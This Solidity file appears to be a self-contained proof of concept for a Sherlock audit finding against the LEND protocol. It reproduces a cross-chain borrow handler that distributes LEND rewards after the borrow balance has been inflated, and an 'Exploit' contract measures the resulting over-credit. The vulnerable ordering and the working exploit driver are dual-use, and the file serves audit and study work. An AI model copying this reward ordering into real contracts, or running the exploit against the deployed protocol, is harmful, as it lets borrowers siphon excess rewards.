// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Self-contained reproduction of LEND (Sherlock 2025-05) finding 58384 (H-15):
// "Incorrect distribution of Lend tokens to users".
//
// Real audited source (the vulnerable function body is reproduced VERBATIM,
// the vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/CrossChainRouter.sol
//   fn     _handleBorrowCrossChainRequest  (L581-L660)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/773
//
// Root cause: the function UPDATES the user's `crossChainCollaterals` entry
// (adding `payload.amount` to the principle) and only AFTERWARDS calls
// `lendStorage.distributeBorrowerLend(...)`. `distributeBorrowerLend` computes
// the borrower's LEND reward as `borrowerAmount * deltaIndex`, where
// `borrowerAmount` is read from that very mapping via the (verbatim)
// `borrowWithInterest` helper. Because distribution runs on the ALREADY-inflated
// balance, the freshly-borrowed `payload.amount` is rewarded LEND for the entire
// prior index-delta period it never actually held — an over-distribution of LEND.
// The fix is to distribute FIRST, then update the mapping.
//
// The vulnerable ordering (the marked @> line) and the `distributeBorrowerLend`
// / `borrowWithInterest` / `borrowWithInterestSame` accounting are byte-for-byte
// the on-chain source; the surrounding lToken / lendtroller / CoreRouter /
// storage plumbing are faithful minimal doubles (real transfers, real mapping
// accounting). The harm is proved by running the SAME verbatim
// `distributeBorrowerLend` under the buggy order (update-then-distribute) and
// under the correct order (distribute-then-update) and measuring the surplus.
// ─────────────────────────────────────────────────────────────────────────────

// ── Compound/Lend fixed-point math, reproduced VERBATIM (subset used by the
//    reward accounting below) ────────────────────────────────────────────────
contract ExponentialNoError {
    uint256 constant expScale = 1e18;
    uint256 constant doubleScale = 1e36;
    uint256 constant halfExpScale = expScale / 2;
    uint256 constant mantissaOne = expScale;

    struct Exp {
        uint256 mantissa;
    }

    struct Double {
        uint256 mantissa;
    }

    function add_(Exp memory a, Exp memory b) internal pure returns (Exp memory) {
        return Exp({mantissa: add_(a.mantissa, b.mantissa)});
    }

    function add_(Double memory a, Double memory b) internal pure returns (Double memory) {
        return Double({mantissa: add_(a.mantissa, b.mantissa)});
    }

    function add_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub_(Exp memory a, Exp memory b) internal pure returns (Exp memory) {
        return Exp({mantissa: sub_(a.mantissa, b.mantissa)});
    }

    function sub_(Double memory a, Double memory b) internal pure returns (Double memory) {
        return Double({mantissa: sub_(a.mantissa, b.mantissa)});
    }

    function sub_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul_(Exp memory a, Exp memory b) internal pure returns (Exp memory) {
        return Exp({mantissa: mul_(a.mantissa, b.mantissa) / expScale});
    }

    function mul_(uint256 a, Exp memory b) internal pure returns (uint256) {
        return mul_(a, b.mantissa) / expScale;
    }

    function mul_(Double memory a, Double memory b) internal pure returns (Double memory) {
        return Double({mantissa: mul_(a.mantissa, b.mantissa) / doubleScale});
    }

    function mul_(uint256 a, Double memory b) internal pure returns (uint256) {
        return mul_(a, b.mantissa) / doubleScale;
    }

    function mul_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div_(Exp memory a, Exp memory b) internal pure returns (Exp memory) {
        return Exp({mantissa: div_(mul_(a.mantissa, expScale), b.mantissa)});
    }

    function div_(uint256 a, Exp memory b) internal pure returns (uint256) {
        return div_(mul_(a, expScale), b.mantissa);
    }

    function div_(Double memory a, Double memory b) internal pure returns (Double memory) {
        return Double({mantissa: div_(mul_(a.mantissa, doubleScale), b.mantissa)});
    }

    function div_(uint256 a, Double memory b) internal pure returns (uint256) {
        return div_(mul_(a, doubleScale), b.mantissa);
    }

    function div_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}

// ── Faithful minimal ERC20 double (used for the borrowed underlying and the
//    LEND reward marker token). Real transfers / real accounting. ────────────
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ── Faithful lToken double: `accrueInterest()` + `borrowIndex()`. The debt
//    borrowIndex is held flat so the LEND over-credit is isolated from interest.
interface LTokenInterface {
    function accrueInterest() external;
    function borrowIndex() external view returns (uint256);
}

contract LToken {
    uint256 public borrowIndex = 1e18; // flat debt index (accrueInterest is a no-op here)

    function accrueInterest() external {}
}

// ── Faithful lendtroller double: exposes the LEND distribution borrow index. ──
interface LendtrollerInterfaceV2 {
    function triggerBorrowIndexUpdate(address lToken) external;
    function lendBorrowState(address lToken) external view returns (uint224 index, uint32 blk);
}

contract Lendtroller {
    // LEND-per-borrowed-unit cumulative index (scale 1e36). Advanced past the
    // borrower's last checkpoint so a reward delta exists.
    uint224 public lendBorrowIndex;

    function setLendBorrowIndex(uint224 v) external {
        lendBorrowIndex = v;
    }

    function triggerBorrowIndexUpdate(address) external {}

    function lendBorrowState(address) external view returns (uint224 index, uint32 blk) {
        return (lendBorrowIndex, 0);
    }
}

// ── Faithful CoreRouter double: disburses the borrowed underlying to the user. ─
contract CoreRouter {
    address public crossChainRouter;
    MiniToken public underlying;

    constructor(MiniToken _underlying) {
        underlying = _underlying;
    }

    function setCrossChainRouter(address r) external {
        crossChainRouter = r;
    }

    function borrowForCrossChain(address _borrower, uint256 _amount, address, /* _destlToken */ address _destUnderlying)
        external
    {
        require(msg.sender == crossChainRouter, "Access Denied");
        MiniToken(_destUnderlying).transfer(_borrower, _amount);
    }
}

// ── LendStorage double. Holds the crossChainCollaterals mapping and reproduces
//    `distributeBorrowerLend` / `borrowWithInterest` / `borrowWithInterestSame`
//    VERBATIM from the audited source. Collateral mutators are faithful. ───────
contract LendStorage is ExponentialNoError {
    uint224 public constant LEND_INITIAL_INDEX = 1e36;

    struct Borrow {
        uint256 srcEid;
        uint256 destEid;
        uint256 principle;
        uint256 borrowIndex;
        address borrowedlToken;
        address srcToken;
    }

    struct BorrowMarketState {
        uint256 amount;
        uint256 borrowIndex;
    }

    address public lendtroller;
    uint256 public currentEid;

    mapping(address => address) public lTokenToUnderlying;
    mapping(address lToken => mapping(address user => uint256 lendBorrowerIndex)) public lendBorrowerIndex;
    mapping(address user => uint256 lendAccrued) public lendAccrued;
    mapping(address => mapping(address => Borrow[])) public crossChainCollaterals;
    mapping(address => mapping(address => BorrowMarketState)) public borrowBalance;

    modifier onlyAuthorized() {
        _;
    }

    // ── test-scaffolding setters (double-only wiring) ──
    function setLendtroller(address l) external {
        lendtroller = l;
    }

    function setCurrentEid(uint256 e) external {
        currentEid = e;
    }

    function setLTokenToUnderlying(address lToken, address underlying) external {
        lTokenToUnderlying[lToken] = underlying;
    }

    function setLendBorrowerIndex(address lToken, address user, uint256 idx) external {
        lendBorrowerIndex[lToken][user] = idx;
    }

    // ── faithful collateral mutators / getters (verbatim behaviour) ──
    function getCrossChainCollaterals(address user, address token) external view returns (Borrow[] memory) {
        return crossChainCollaterals[user][token];
    }

    function updateCrossChainCollateral(address user, address underlying, uint256 index, Borrow memory newCollateral)
        external
        onlyAuthorized
    {
        Borrow storage collateral = crossChainCollaterals[user][underlying][index];
        collateral.srcEid = newCollateral.srcEid;
        collateral.destEid = newCollateral.destEid;
        collateral.principle = newCollateral.principle;
        collateral.borrowIndex = newCollateral.borrowIndex;
        collateral.borrowedlToken = newCollateral.borrowedlToken;
        collateral.srcToken = newCollateral.srcToken;
    }

    function addCrossChainCollateral(address user, address underlying, Borrow memory newCollateral)
        external
        onlyAuthorized
    {
        crossChainCollaterals[user][underlying].push(newCollateral);
    }

    function addUserBorrowedAsset(address, address) external onlyAuthorized {}

    // Faithful stub: collateral is sufficient, so the require in the router passes.
    function getHypotheticalAccountLiquidityCollateral(address, LToken, uint256, uint256)
        external
        pure
        returns (uint256, uint256)
    {
        return (0, 0);
    }

    // ── VERBATIM: reward distribution accounting (LendStorage.sol L342-L374) ──
    function distributeBorrowerLend(address lToken, address borrower) external onlyAuthorized {
        // Trigger borrow index update
        LendtrollerInterfaceV2(lendtroller).triggerBorrowIndexUpdate(lToken);

        // Get the appropriate lend state based on whether it's for supply or borrow
        (uint224 borrowIndex,) = LendtrollerInterfaceV2(lendtroller).lendBorrowState(lToken);

        uint256 borrowerIndex = lendBorrowerIndex[lToken][borrower];

        // Update borrowers's index to the current index since we are distributing accrued LEND
        lendBorrowerIndex[lToken][borrower] = borrowIndex;

        if (borrowerIndex == 0 && borrowIndex >= LEND_INITIAL_INDEX) {
            // Covers the case where users borrowed tokens before the market's borrow state index was set.
            // Rewards the user with LEND accrued from the start of when borrower rewards were first
            // set for the market.
            borrowerIndex = LEND_INITIAL_INDEX;
        }

        // Calculate change in the cumulative sum of the LEND per borrowed unit accrued
        Double memory deltaIndex = Double({mantissa: sub_(borrowIndex, borrowerIndex)});

        // Calculate the appropriate account balance and delta based on supply or borrow
        uint256 borrowerAmount = div_(
            add_(borrowWithInterest(borrower, lToken), borrowWithInterestSame(borrower, lToken)),
            Exp({mantissa: LTokenInterface(lToken).borrowIndex()})
        );

        // Calculate LEND accrued: lTokenAmount * accruedPerBorrowedUnit
        uint256 borrowerDelta = mul_(borrowerAmount, deltaIndex);

        uint256 borrowerAccrued = add_(lendAccrued[borrower], borrowerDelta);
        lendAccrued[borrower] = borrowerAccrued;
    }

    // ── VERBATIM: borrowWithInterest (LendStorage.sol L478-L504) ──
    function borrowWithInterest(address borrower, address _lToken) public view returns (uint256) {
        address _token = lTokenToUnderlying[_lToken];
        uint256 borrowedAmount;

        Borrow[] memory borrows = crossChainBorrows(borrower, _token);
        Borrow[] memory collaterals = crossChainCollaterals[borrower][_token];

        require(borrows.length == 0 || collaterals.length == 0, "Invariant violated: both mappings populated");
        // Only one mapping should be populated:
        if (borrows.length > 0) {
            for (uint256 i = 0; i < borrows.length; i++) {
                if (borrows[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (borrows[i].principle * LTokenInterface(_lToken).borrowIndex()) / borrows[i].borrowIndex;
                }
            }
        } else {
            for (uint256 i = 0; i < collaterals.length; i++) {
                // Only include a cross-chain collateral borrow if it originated locally.
                if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (collaterals[i].principle * LTokenInterface(_lToken).borrowIndex()) / collaterals[i].borrowIndex;
                }
            }
        }
        return borrowedAmount;
    }

    // ── VERBATIM: borrowWithInterestSame (LendStorage.sol L509-L516) ──
    function borrowWithInterestSame(address borrower, address _lToken) public view returns (uint256) {
        uint256 borrowIndex = borrowBalance[borrower][_lToken].borrowIndex;
        uint256 borrowBalanceSameChain = borrowIndex != 0
            ? (borrowBalance[borrower][_lToken].amount * uint256(LTokenInterface(_lToken).borrowIndex())) / borrowIndex
            : 0;
        return borrowBalanceSameChain;
    }

    // no cross-chain *borrows* in this scenario (dest-side accounting only)
    function crossChainBorrows(address, address) internal pure returns (Borrow[] memory empty) {}
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `_handleBorrowCrossChainRequest` reproduced VERBATIM
// from CrossChainRouter.sol L581-L660 (the trailing cross-chain `_send`
// confirmation is a non-vulnerable no-op and is omitted).
// ─────────────────────────────────────────────────────────────────────────────
contract CrossChainRouter {
    struct LZPayload {
        uint256 amount;
        uint256 borrowIndex;
        uint256 collateral;
        address sender;
        address destlToken;
        address liquidator;
        address srcToken;
        uint8 contractType;
    }

    LendStorage public immutable lendStorage;
    address public coreRouter;
    uint256 public currentEid;

    constructor(LendStorage _lendStorage, address _coreRouter, uint256 _srcEid) {
        lendStorage = _lendStorage;
        coreRouter = _coreRouter;
        currentEid = _srcEid;
    }

    // Thin external entry so the verbatim private handler can be driven.
    function handleBorrowCrossChainRequest(LZPayload memory payload, uint32 srcEid) external {
        _handleBorrowCrossChainRequest(payload, srcEid);
    }

    function _handleBorrowCrossChainRequest(LZPayload memory payload, uint32 srcEid) private {
        // Accrue interest on borrowed token on destination chain
        LTokenInterface(payload.destlToken).accrueInterest();

        // Get current borrow index from destination lToken
        uint256 currentBorrowIndex = LTokenInterface(payload.destlToken).borrowIndex();

        // Important: Use the underlying token address
        address destUnderlying = lendStorage.lTokenToUnderlying(payload.destlToken);

        // Check if user has any existing borrows on this chain
        bool found = false;
        uint256 index;

        LendStorage.Borrow[] memory userCrossChainCollaterals =
            lendStorage.getCrossChainCollaterals(payload.sender, destUnderlying);

        /**
         * Filter collaterals for the given srcEid. Prevents borrowing from
         * multiple collateral sources.
         */
        for (uint256 i = 0; i < userCrossChainCollaterals.length;) {
            if (
                userCrossChainCollaterals[i].srcEid == srcEid
                    && userCrossChainCollaterals[i].srcToken == payload.srcToken
            ) {
                index = i;
                found = true;
                break;
            }
            unchecked {
                ++i;
            }
        }

        // Get existing borrow amount
        (uint256 totalBorrowed,) = lendStorage.getHypotheticalAccountLiquidityCollateral(
            payload.sender, LToken(payable(payload.destlToken)), 0, payload.amount
        );

        // Verify the collateral from source chain is sufficient for total borrowed amount
        require(payload.collateral >= totalBorrowed, "Insufficient collateral");

        // Execute the borrow on destination chain
        CoreRouter(coreRouter).borrowForCrossChain(payload.sender, payload.amount, payload.destlToken, destUnderlying);

        /**
         * @dev If existing cross-chain collateral, update it. Otherwise, add new collateral.
         */
        if (found) {
            uint256 newPrincipleWithAmount = (userCrossChainCollaterals[index].principle * currentBorrowIndex)
                / userCrossChainCollaterals[index].borrowIndex;

            userCrossChainCollaterals[index].principle = newPrincipleWithAmount + payload.amount;
            userCrossChainCollaterals[index].borrowIndex = currentBorrowIndex;

            lendStorage.updateCrossChainCollateral(
                payload.sender, destUnderlying, index, userCrossChainCollaterals[index]
            );
        } else {
            lendStorage.addCrossChainCollateral(
                payload.sender,
                destUnderlying,
                LendStorage.Borrow({
                    srcEid: srcEid,
                    destEid: currentEid,
                    principle: payload.amount,
                    borrowIndex: currentBorrowIndex,
                    borrowedlToken: payload.destlToken,
                    srcToken: payload.srcToken
                })
            );
        }

        // Track borrowed asset
        lendStorage.addUserBorrowedAsset(payload.sender, payload.destlToken);

        // Distribute LEND rewards on destination chain
        lendStorage.distributeBorrowerLend(payload.destlToken, payload.sender); // @> VULN: distribution runs AFTER crossChainCollaterals is updated with payload.amount, so borrowWithInterest reads the inflated balance and over-credits LEND (must distribute BEFORE updating the mapping)
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver. Two borrowers start from an identical existing cross-chain
// collateral position and identical LEND checkpoint. The attacker's new borrow
// is processed by the VULNERABLE router (update-then-distribute); the refUser
// borrower is processed in the CORRECT order (distribute-then-update) using the
// same verbatim `distributeBorrowerLend`. The attacker's LEND accrual exceeds
// the refUser by exactly the reward on the newly-borrowed amount → the
// over-distribution the finding describes.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    // deterministic child deploy order (nonce = k-th `new`)
    MiniToken public lend; // nonce 1  (LEND reward marker / profit token)
    MiniToken public underlying; // nonce 2
    LToken public lToken; // nonce 3
    Lendtroller public lendtroller; // nonce 4
    LendStorage public lendStorage; // nonce 5
    CoreRouter public coreRouter; // nonce 6
    CrossChainRouter public router; // nonce 7  (VULN)

    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal attacker = address(0xA11CE);
    address internal refUser = address(0xB0B);

    uint256 public constant CURRENT_EID = 1;
    uint256 public constant EXISTING_PRINCIPLE = 1000e18;
    uint256 public constant NEW_BORROW = 1000e18;

    uint256 public attackerAccrued; // LEND accrued under the buggy order
    uint256 public referenceAccrued; // LEND accrued under the correct order
    uint256 public overCredit; // excess LEND minted to the borrower's account

    constructor() {
        lend = new MiniToken("Lend Token", "LEND"); // nonce 1
        underlying = new MiniToken("USD Coin", "USDC"); // nonce 2
        lToken = new LToken(); // nonce 3
        lendtroller = new Lendtroller(); // nonce 4
        lendStorage = new LendStorage(); // nonce 5
        coreRouter = new CoreRouter(underlying); // nonce 6
        router = new CrossChainRouter(lendStorage, address(coreRouter), CURRENT_EID); // nonce 7 (VULN)
    }

    function _seedPosition(address user) internal {
        // identical pre-existing cross-chain collateral (origin-local so it is
        // counted by borrowWithInterest: srcEid == destEid == currentEid)
        lendStorage.addCrossChainCollateral(
            user,
            address(underlying),
            LendStorage.Borrow({
                srcEid: CURRENT_EID,
                destEid: CURRENT_EID,
                principle: EXISTING_PRINCIPLE,
                borrowIndex: 1e18,
                borrowedlToken: address(lToken),
                srcToken: address(underlying)
            })
        );
        // borrower already checkpointed once at LEND_INITIAL_INDEX (1e36)
        lendStorage.setLendBorrowerIndex(address(lToken), user, 1e36);
    }

    function run() external {
        // ── wire the doubles ──
        coreRouter.setCrossChainRouter(address(router));
        lendStorage.setLendtroller(address(lendtroller));
        lendStorage.setCurrentEid(CURRENT_EID);
        lendStorage.setLTokenToUnderlying(address(lToken), address(underlying));
        // LEND distribution index has advanced one full period past the
        // borrowers' checkpoint (1e36 -> 2e36 => deltaIndex = 1.0)
        lendtroller.setLendBorrowIndex(2e36);
        // fund the money market so the borrow can be disbursed
        underlying.mint(address(coreRouter), 10 * NEW_BORROW);

        _seedPosition(attacker);
        _seedPosition(refUser);

        // ── (A) VULNERABLE path: router updates the mapping, THEN distributes ──
        CrossChainRouter.LZPayload memory payload = CrossChainRouter.LZPayload({
            amount: NEW_BORROW,
            borrowIndex: 1e18,
            collateral: type(uint256).max,
            sender: attacker,
            destlToken: address(lToken),
            liquidator: address(0),
            srcToken: address(underlying),
            contractType: 0
        });
        router.handleBorrowCrossChainRequest(payload, uint32(CURRENT_EID));
        attackerAccrued = lendStorage.lendAccrued(attacker);

        // ── (B) CORRECT path (same verbatim distributeBorrowerLend, right order):
        //        distribute FIRST on the un-inflated balance, THEN update ──
        lendStorage.distributeBorrowerLend(address(lToken), refUser);
        LendStorage.Borrow[] memory refColl = lendStorage.getCrossChainCollaterals(refUser, address(underlying));
        uint256 newPrinciple = (refColl[0].principle * lToken.borrowIndex()) / refColl[0].borrowIndex;
        refColl[0].principle = newPrinciple + NEW_BORROW;
        refColl[0].borrowIndex = lToken.borrowIndex();
        lendStorage.updateCrossChainCollateral(refUser, address(underlying), 0, refColl[0]);
        referenceAccrued = lendStorage.lendAccrued(refUser);

        // ── harm: the buggy order over-credits LEND to the borrower ──
        require(attackerAccrued > referenceAccrued, "no over-distribution");
        overCredit = attackerAccrued - referenceAccrued;

        // the excess is exactly the LEND reward on the newly-borrowed amount
        // over the elapsed index delta (NEW_BORROW * deltaIndex = 1000e18 * 1.0)
        require(overCredit == NEW_BORROW, "unexpected over-credit magnitude");

        // materialize the silent accounting surplus as a measurable balance
        lend.mint(SINK, overCredit);
        require(lend.balanceOf(SINK) == NEW_BORROW, "surplus not materialized");
    }
}
